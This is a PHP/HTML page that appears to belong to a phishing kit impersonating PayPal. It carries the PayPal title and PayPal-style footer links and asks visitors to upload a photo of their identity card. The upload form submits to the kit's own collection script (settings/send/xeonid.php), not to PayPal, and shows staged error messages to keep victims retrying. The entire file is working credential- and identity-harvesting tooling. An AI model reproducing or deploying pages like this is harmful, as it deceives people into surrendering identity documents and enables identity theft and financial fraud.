<?php
	
	session_start();

	include("../settings/lang/index.php");
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/sections.js"></script>
</head>
<body>

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="xeonContent xeonContentInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="xeonInfo">
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon46; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon47; ?></p>
							<form action="../settings/send/xeonid.php" method="post" name="idForm" onsubmit="return validateIdForm()" enctype="multipart/form-data">
							

								<p class="FieldsTitle" style="text-align: center;"><?php echo $xeon48; ?></p>
								<div class="xeonIdpicbox">
									<img src="../assets/img/idcard.svg" alt="">
								</div>


								<div class="file-upload">
									<!--<button class="file-upload-btn" type="button" onclick="$('.file-upload-input').trigger( 'click' )">Add Image</button>-->
									
									
										<?php
											$url = $_SERVER[REQUEST_URI];
   											if(strpos($url, "inconnufile") == true || strpos($url, "checkfile") == true || strpos($url, "unexistfile") == true) {
   												echo "<p class=\"fileUpError\">Sorry, only JPG, JPEG, PNG & GIF files are allowed.</p>";
   												$errrror = "idhasError";
   											} elseif(strpos($url, "largesizefile") == true) {
   												echo "<p class=\"fileUpError\">Sorry, your file is too large.</p>";
   												$errrror = "idhasError";
   											} elseif(strpos($url, "error") == true) {
   												echo "<p class=\"fileUpError\">Sorry, there was an error uploading your file.</p>";
   												$errrror = "idhasError";
   											}
										?>
									

									<div class="image-upload-wrap <?php echo $errrror; ?>" id="imgUp">
									   	<input class="file-upload-input" name="fileToUpload" id="xeonIdinp" type='file' onchange="readURL(this);" accept="image/*" />
										<div class="drag-text">
											<svg class="dragicon" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
											 viewBox="0 0 512.4 512.4" style="enable-background:new 0 0 512.4 512.4;" xml:space="preserve"><g><g><path d="M486.8,269.8c-16-15.6-37.6-25.2-61.2-25.6c-2.8-40.4-20.4-76.4-47.2-103.2c-30-29.6-70.4-48-115.6-48
													c-34.8,0-67.2,10.8-93.6,29.6c-24.8,17.6-44.8,42-56.8,70.4c-31.2,0-59.2,12.8-79.6,33.2C12.8,246.6,0,275,0,306.2
													s12.8,59.6,33.2,80c20.4,20.4,48.8,33.2,80,33.2h107.2c6.4,0,12-5.2,12-12v-84c0-6.4-5.2-12-12-12H212l23.2-31.2l27.2-37.2
													l27.2,37.2l23.2,31.2h-8.4c-6.4,0-12,5.2-12,12v84c0,6.4,5.2,12,12,12h120h0.4c24,0,46-9.6,62-25.6s25.6-37.6,25.6-62
													C512.4,307.8,502.8,285.8,486.8,269.8z M469.6,376.6c-11.6,11.6-27.6,18.8-45.2,18.8H424H316v-60h20c6.4,0,12-5.2,12-12
													c0-2.8-1.2-5.6-2.8-7.6l-36.4-49.6L272,215.8c-4-5.2-11.2-6.4-16.4-2.4c-1.2,0.8-2,1.6-2.8,2.8l-36.8,50l-37.2,50
													c-4,5.2-2.8,12.8,2.4,16.4c2,1.6,4.4,2.4,7.2,2.4h20v60.4h-95.2c-24.8,0-47.2-10-63.2-26S24,331,24,306.2c0-24.8,10-47.2,26-63.2
													c16-16,38.4-26,63.2-26c2,0,2.8,0,3.2,0c0.8,0,1.6,0,3.2,0c5.6,0.4,10.8-3.2,12.4-8.8c10-26.8,27.6-50,50.8-66
													c22.8-16,50-25.2,80-25.2c38.4,0,73.2,15.6,98.4,40.8s40.8,60,40.8,98.4c0,0.4,0,0.8,0,0.8c0,6.4,5.2,11.6,11.6,11.6
													c0.4,0,1.2,0,1.6,0c1.2,0,2.8-0.4,4.4-0.4c1.2,0,2.8,0,4.4,0c17.6,0,33.6,7.2,45.2,18.8c11.6,11.6,18.8,27.6,18.8,45.2
													C488,349.4,481.2,365.4,469.6,376.6z"/></g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg>
										    <h3><?php echo $xeon49; ?></h3>
										</div>
								  	</div>
								  	<div class="file-upload-content">
								    	<img class="file-upload-image" src="#" alt="your image" />
								    	<div class="image-title-wrap">
								      		<button type="button" onclick="removeUpload()" class="remove-image"><?php echo $xeon50; ?></span></button>
								   	 	</div>
								  	</div>
								</div>

								<input type="submit" class="xeonButton" value="<?php echo $xeon51; ?>" style="margin-top: 10px;">
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>
	
</body>
</html>